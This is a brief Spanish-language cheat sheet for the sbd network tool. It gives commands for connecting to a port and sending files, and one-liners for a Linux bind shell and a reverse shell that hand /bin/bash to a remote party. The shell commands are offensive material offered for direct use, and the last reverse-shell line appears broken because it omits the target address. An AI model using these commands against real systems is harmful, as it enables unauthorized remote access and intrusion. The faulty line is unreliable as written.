# sbd Cheat Sheet

#### Conectarnos a un puerto de un host

- `sbd <IP-ADDRESS> <PORT>`: Conexión a un host.

#### Transferir un archivo

- `sbd -lp <PORT> -k secret > output.txt`: Host a recibir el archivo en el puerto especificado.

- `cat input.txt | sbd -k secret <IP-ADDRESS> <PORT>`: Host que envia el archivo.

#### Bind Shell (Linux)

- `sbd -nvlp <PORT> -e /bin/bash`: Escuchando la conexión.

- `sbd <IP-ADDRESS> <PORT>`: Conexión a la shell.

#### Reverse Shell (Linux)

- `sbd -nvlp <PORT>`: Escuchando la conexión.

- `sbd -nv <PORT> -e /bin/bash`: Conexión al host y mandamos la shell.